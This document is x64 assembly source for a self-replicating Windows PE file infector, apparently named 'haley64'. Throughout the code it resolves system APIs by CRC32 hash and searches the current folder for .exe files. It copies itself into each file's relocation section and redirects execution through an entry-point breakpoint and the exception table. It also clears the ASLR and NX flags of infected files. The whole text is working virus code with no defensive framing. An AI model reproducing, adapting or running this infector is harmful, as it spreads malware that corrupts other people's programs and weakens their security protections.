extern  MessageBoxA:proc
extern  ExitProcess:proc
include haley.inc
.code
haley64         proc
        push    60h                          ;PEB
        pop     rsi
        lods    qword ptr gs:[rsi]
        mov     rcx, [r9]
        mov     byte ptr [rcx], "h"          ;restore opcode
        db      48h
        db      89h
        db      25h
        dd      rip + (offset restore_rsp - offset delta_rsp) + 2
                                             ;all code must be under delta_rsp! else fails occurs
delta_rsp       label    near
        jmp     find_ntkrn

restore_rsp     label    near
        mov     rsp, "rsprsp"
        xor     rax, rax                     ;EXCEPTION_CONTINUE_EXECUTION++
        ret

;-------------------------------------------------------------------------------
;walk lists
;-------------------------------------------------------------------------------

walk_dll        label    near
        pop     r8

walk_start      label    near
        mov     eax, dword ptr [rbp + IMAGE_DOS_HEADER.e_lfanew]
        mov     ebx, dword ptr [rbp + rax + IMAGE_OHDD64_EXPORT_TABLE]
        add     rbx, rbp
        xor     edx, edx

walk_names      label    near
        mov     esi, dword ptr [rbx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     rsi, rbp
        mov     esi, dword ptr [rsi + rdx * 4]
        add     rsi, rbp
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [rsi]
        push    8
        pop     rcx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     rsi
        cmp     byte ptr [rsi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [rdi], eax
        je      l_res
        inc     edx
        cmp     dword ptr [rbx + IMAGE_EXPORT_DIRECTORY.NumberOfNames], edx
        jne     walk_names
        jmp     restore_rsp

;-------------------------------------------------------------------------------
;resolve API address
;-------------------------------------------------------------------------------

l_res           label    near
        mov     esi, dword ptr [rbx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        add     rsi, rbp
        movzx   esi, word ptr [rsi + rdx * 2]
        mov     eax, dword ptr [rbx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        add     rax, rbp
        mov     eax, dword ptr [rax + rsi * 4]
        add     rax, rbp
        push    rax
        scas    dword ptr [rdi]
        cmp     byte ptr [rdi], "*"
        jne     walk_start
        jmp     r8

find_ntkrn      label    near
        mov     rax, qword ptr [rax + PEB_LDR_DATA + Ldr]
        mov     rsi, qword ptr [rax + Ldr + InMemoryOrderModuleList]
        lods    qword ptr [rsi]
        mov     rbp, qword ptr [rax + 20h]
        mov     r9, rax
        call    call_wdll

;-------------------------------------------------------------------------------
;API CRC lists for ntdll.dll and kernel32.dll
;-------------------------------------------------------------------------------

        dd      0baab0208h
        dd      0fed80136h
        db      2ah                          ;1 byte terminator
                                             ;no CRC listed can begin with 2A
        dd      0553b5c78h
        dd      0b41b926ch
        dd      0b09315f4h
        dd      0c9ebd5ceh
        dd      075272948h
        dd      0a89b382fh
        dd      0391ab6afh
        db      2ah                          ;1 byte terminator
                                             ;no CRC listed can begin with 2A
        db      2eh, 65h, 78h, 65h, 0        ;executable file

;-------------------------------------------------------------------------------
;calls to retrieve API addresses
;----
;find exe files
;-------------------------------------------------------------------------------

call_wdll       label    near
        pop     rdi
        call    walk_dll 
        mov     rsi, r9
        scas    byte ptr [rdi]
        lods    qword ptr [rsi]
        mov     rbp, qword ptr [rax + 20h]
        call    walk_dll
        push    rdi
        pop     rcx
        push    rsp
        pop     rdi
        enter   sizeof WIN32_FIND_DATA + (sizeof IMAGE_NT_HEADERS.OptionalHeader64.AddressOfEntryPoint - 2), 0
        push    rbp
        push    rsp
        pop     rsi
        push    rsi
        pop     rdx
        sub     rsp, 28h
        call    kFindFirstFileA 
        xchg    rbp, rax
        xor     rbx, rbx

;-------------------------------------------------------------------------------
;map view
;-------------------------------------------------------------------------------

create_map      label    near
        push    rbp
        push    3                            ;OPEN_EXISTING
        sub     rsp, 20h
        xor     r9, r9
        xor     r8, r8
        push    3                            ;GENERIC_READ or GENERIC_WRITE
        pop     rdx
        lea     rcx, qword ptr [rsi + WIN32_FIND_DATA.cFileName]
        call    kCreateFileA
        add     rsp, 28h
        push    rax
        push    rax
        push    rbx
        push    rbx
        sub     rsp, 20h
        xor     r9, r9
        push    4                            ;PAGE_READWRITE
        pop     r8
        push    rbx
        pop     rdx
        xchg    rcx, rax
        call    kCreateFileMappingA 
        add     rsp, 30h
        push    rax
        push    rax
        push    rbx
        sub     rsp, 20h
        xor     r9, r9
        xor     r8, r8
        push    2                            ;FILE_MAP_WRITE
        pop     rdx
        xchg    rcx, rax
        call    kMapViewOfFile 
        add     rsp, 28h
        xchg    rbp, rax
        call    infect_pe64
        mov     rax, qword ptr [rcx + POINTER_CONTEXT_RECORD]
        add     rax, 7fh
        call    varfixes
        pop     rcx
        pop     rdi
        pop     rsi
        sub     rsp, 28h
        call    ntRtlRemoveVectoredExceptionHandler
        add     rsp, 28h
        pop     rbx
        pop     rcx
        sub     rsp, 28h
        call    kUnmapViewOfFile 
        add     rsp, 30h
        pop     rcx
        sub     rsp, 28h
        call    kCloseHandle 
        add     rsp, 30h
        pop     rcx
        sub     rsp, 28h
        call    kCloseHandle 
        add     rsp, 28h
        pop     rbp
        push    rsi
        pop     rdx
        push    rbp
        pop     rcx
        call    kFindNextFileA 
        test    rax, rax
        jnz     create_map
        jmp     restore_rsp

varfixes        proc
        pop     qword ptr [rax + CONTEXT_RIP - 7fh]
        push    qword ptr [rax + CONTEXT_R12 - 7fh]

                                             ;RSP is lost
        pop     qword ptr [rax + CONTEXT_RSP - 7fh]
        or      eax, EXCEPTION_CONTINUE_EXECUTION
        ret
varfixes        endp

infect_pe64     label    near

;-------------------------------------------------------------------------------
;MZ and PE signatures
;-------------------------------------------------------------------------------

        pop     rcx
        push    rcx
        pop     rdx
        sub     rsp, 28h
        call    ntRtlAddVectoredExceptionHandler
        add     rsp, 28h
        push    rbp
        push    rbx
        push    rsi
        push    rdi
        push    rax
        mov     r12, rsp
        push    rbp
        pop     rax
        cmp     word ptr [rax], "ZM"
        jne     call_veh
        add     eax, dword ptr [rax + IMAGE_DOS_HEADER.e_lfanew]
        cmp     dword ptr [rax], "EP"
        jne     call_veh

;-------------------------------------------------------------------------------
;AMD64
;GUI or CUI mode
;----
;if the code fits in relocs then infect
;-------------------------------------------------------------------------------

        mov     bl, IMAGE_OHDD64_RELOC_TABLE
        cmp     word ptr [rax + IMAGE_NT_HEADERS.FileHeader.Machine], IMAGE_FILE_MACHINE_AMD64
        jne     call_veh
        movzx   rcx, byte ptr [rax + IMAGE_OH64_SUBSYSTEM]
        sub     cl, 2
        cmp     cl, IMAGE_SUBSYSTEM_WINDOWS_CUI - IMAGE_SUBSYSTEM_WINDOWS_GUI
        jnbe    call_veh
        movzx   rdx, word ptr [rax + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
        movzx   rcx, word ptr [rax + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
        push    rdx
        push    rcx
        imul    rcx, rcx, sizeof IMAGE_SECTION_HEADER
        lea     rsi, qword ptr [rax + rcx + (IMAGE_NT_HEADERS.OptionalHeader64 - sizeof IMAGE_SECTION_HEADER)]
        add     rsi, rdx
        mov     rdx, qword ptr [rax + rbx]

                                             ;relocation data should be at beginning of last section
        cmp     dword ptr [rsi + IMAGE_SECTION_HEADER.VirtualAddress], edx
        jne     call_veh

;-------------------------------------------------------------------------------
;large enough to contain code
;reloc dir size can be faked.  sizeofimage covers virtual size required, physical
;data size is to be checked against code size
;-------------------------------------------------------------------------------

        cmp     dword ptr [rsi + IMAGE_SECTION_HEADER.SizeOfRawData], (offset haley64_tail - offset haley64) + sizeof IMAGE_RUNTIME_FUNCTION_ENTRY + 8 
        jb      call_veh
        mov     ecx, dword ptr [rax + rbx - (IMAGE_OHDD64_RELOC_TABLE - IMAGE_OHDD64_EXCEPTION_DIRECTORY)]
        jecxz   add_excptbl

call_veh        label    near
        int     3                            ;end up crashing
                                             ;but it was a trick and the clock struck twelve

;-------------------------------------------------------------------------------
;happy time
;entrypoint obscuring thing
;-------------------------------------------------------------------------------

add_excptbl     label    near
        push    rbp
        pop     rdi
        add     edi, dword ptr [rsi + IMAGE_SECTION_HEADER.PointerToRawData]
        push    rax
        mov     eax, dword ptr [rax + IMAGE_NT_HEADERS.OptionalHeader64.AddressOfEntryPoint]
        push    rax
        pop     rcx
        stos    dword ptr [rdi]              ;beginning address
        inc     eax                          ;entrypoint + sizeof INT3
        stos    dword ptr [rdi]              ;ending address
        lea     eax, dword ptr [edx + sizeof IMAGE_RUNTIME_FUNCTION_ENTRY]
        stos    dword ptr [rdi]              ;unwind struct address
        push    rax
        push    00011001b                    ;UNWIND_INFO: UNW_FLAG_EHANDLER (exception handler) + UNW_FLAG_UHANDLER (termination handler) and version 1 of UNWIND_INFO
        pop     rax
        stos    dword ptr [rdi]              ;flags
        pop     rax
        add     eax, 8
        stos    dword ptr [rdi]              ;appended code entrypoint
        pop     rax
        or      dword ptr [rsi + IMAGE_SECTION_HEADER.Characteristics], IMAGE_SCN_MEM_EXECUTE + IMAGE_SCN_MEM_WRITE
        mov     dword ptr [rax + rbx - (IMAGE_OHDD64_RELOC_TABLE - IMAGE_OHDD64_EXCEPTION_DIRECTORY)], edx

                                             ;size must be set
        mov     dword ptr [rax + rbx - (IMAGE_OHDD64_RELOC_TABLE - IMAGE_OHDD64_EXCEPTION_DIRECTORY) + 4], 0ch

varfix_rip      label    near
        db      48h
        db      8dh
        db      35h
        dd      rip - (offset varfix_rip - offset haley64) - 7
        push    rcx
        push    rdi
        mov     ecx, offset haley64_tail - offset haley64
        rep movsb                            ;copy code to relocs

                                             ;unset DYNAMIC_BASE, NX_COMPAT flags
        mov     word ptr [rax + IMAGE_OH64_DLLCHARACTERISTICS], cx
        mov     qword ptr [rax + rbx], rcx
        pop     rdi
        pop     rdx
        pop     rcx
        pop     rbx
        lea     rsi, qword ptr [rbx + rax + IMAGE_NT_HEADERS.OptionalHeader64]

find_loop       label    near
        mov     ebx, dword ptr [rsi + IMAGE_SECTION_HEADER.VirtualAddress]
        add     ebx, dword ptr [rsi + IMAGE_SECTION_HEADER.SizeOfRawData]
        cmp     edx, ebx
        jnb     sect_size
        sub     edx, dword ptr [rsi + IMAGE_SECTION_HEADER.VirtualAddress]
        add     edx, dword ptr [rsi + IMAGE_SECTION_HEADER.PointerToRawData]

                                             ;entrypoint must be writeable
        or      dword ptr [rsi + IMAGE_SECTION_HEADER.Characteristics], IMAGE_SCN_MEM_WRITE
        mov     bl, INT3_OPCODE              ;you have been interrupted ;)
                                             ;INTO would be nice, too.  but that requires to set
                                             ;overflow flag
        xchg    byte ptr [rbp + rdx], bl
        mov     byte ptr [rdi + UNW_FLAG_EHANDLER * 0bh], bl

sect_size       label    near
        add     rsi, sizeof IMAGE_SECTION_HEADER
        loop    find_loop
        int     3
haley64_tail    label    near
haley64         endp

entry64         proc                         ;/entry:entry64
        lea     rax, replace_op
        push    rax
        mov     r9, rsp
        call    haley64
        xor     r9, r9
        lea     r8, gtitle
        lea     rdx, gbody
        xor     rcx, rcx
        call    MessageBoxA
        xor     rcx, rcx
        call    ExitProcess 
entry64         endp

replace_op      db     0                     ;var address fakes ControlPc
                                             ;the digital smile...

gtitle          db     "H", 0
gbody           db     "kaye", 0
end